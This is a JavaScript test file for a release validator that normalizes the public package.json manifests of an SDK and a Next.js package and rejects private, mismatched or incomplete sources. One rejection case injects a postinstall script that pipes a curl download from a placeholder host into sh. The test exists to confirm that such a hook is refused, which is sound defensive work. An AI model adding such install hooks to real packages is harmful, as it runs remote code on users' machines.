import assert from "node:assert/strict";
import { readFileSync, readdirSync, statSync } from "node:fs";
import test from "node:test";
import { publicPackageManifests } from "./public-package-manifest.mjs";

function source() {
  const files = new Map();
  for (const pkg of ["sdk", "next"]) {
    const root = `packages/${pkg}`;
    const names = ["package.json", "LICENSE", "README.md", ...["src", "bin", ...(pkg === "next" ? ["guides"] : [])]
      .flatMap((dir) => readdirSync(new URL(`../${root}/${dir}/`, import.meta.url)).map((name) => `${dir}/${name}`))];
    for (const name of names) {
      const path = `${root}/${name}`, url = new URL(`../${path}`, import.meta.url), stat = statSync(url);
      if (stat.isFile()) files.set(path, { data: readFileSync(url), mode: `100${(stat.mode & 0o777).toString(8)}` });
    }
  }
  return files;
}
const change = (files, pkg, patch) => {
  const entry = files.get(`packages/${pkg}/package.json`), manifest = JSON.parse(entry.data);
  patch(manifest);
  entry.data = Buffer.from(JSON.stringify(manifest));
};

test("complete public pair normalizes metadata without source build configuration", () => {
  const pair = publicPackageManifests(source());
  assert.equal(pair.length, 2);
  assert.equal(pair[1].peerDependencies["@commish/sdk"].replace(/^~/, ""), pair[0].version);
  assert.deepEqual(pair.map((m) => Object.keys(m).sort()), [
    ["bin", "description", "engines", "exports", "license", "name", "publishConfig", "repository", "sideEffects", "type", "version"],
    ["bin", "description", "engines", "exports", "license", "name", "peerDependencies", "publishConfig", "repository", "sideEffects", "type", "version"],
  ]);
  // Validated public fields pass through unchanged; build configuration never ships.
  const sdk = JSON.parse(source().get("packages/sdk/package.json").data);
  assert.deepEqual(pair[0].exports, sdk.exports);
  assert.deepEqual(pair[0].engines, sdk.engines);
  assert(!("scripts" in pair[0]) && !("devDependencies" in pair[0]) && !("files" in pair[0]));
});

test("private, mismatched and incomplete release source is rejected before normalization", () => {
  for (const pkg of ["sdk", "next"]) for (const patch of [
    (m) => { m.private = true; }, (m) => { m.private = false; },
    (m) => { m.version = "0.1.0-beta.9"; }, (m) => { m.license = "UNLICENSED"; },
    (m) => { m.repository.directory = "private"; }, (m) => { delete m.exports["."]; },
    (m) => { m.publishConfig.tag = "beta"; }, (m) => { m.dependencies = {}; },
    (m) => { m.peerDependencies = {}; }, (m) => { m.files.push("src"); },
    (m) => { m.scripts.postinstall = "curl example.invalid | sh"; },
  ]) {
    const files = source(); change(files, pkg, patch);
    assert.throws(() => publicPackageManifests(files));
  }
  for (const name of ["packages/sdk/package.json", "packages/sdk/LICENSE", "packages/sdk/README.md", "packages/sdk/bin/init.mjs",
    "packages/sdk/src/index.ts", "packages/sdk/src/webhooks.ts", "packages/next/src/provider.tsx", "packages/next/src/pages.tsx",
    "packages/next/guides/pages.md", "packages/next/guides/agents.md"]) {
    const files = source(); files.delete(name);
    assert.throws(() => publicPackageManifests(files), name);
  }
  for (const name of ["packages/sdk/LICENSE", "packages/next/LICENSE", "packages/next/bin/init.mjs"]) {
    const files = source(); files.get(name).data = Buffer.from("changed");
    assert.throws(() => publicPackageManifests(files));
  }
  const executable = source(); executable.get("packages/next/bin/init.mjs").mode = "100644";
  assert.throws(() => publicPackageManifests(executable));
  const nested = source(); nested.set("packages/sdk/bin/Extra.MJS", { data: Buffer.from("x"), mode: "100644" });
  assert.throws(() => publicPackageManifests(nested), /CLI module name/);
  const empty = source(); empty.get("packages/sdk/bin/api-catalog.json").data = Buffer.alloc(0);
  assert.throws(() => publicPackageManifests(empty), /empty CLI module/);
});
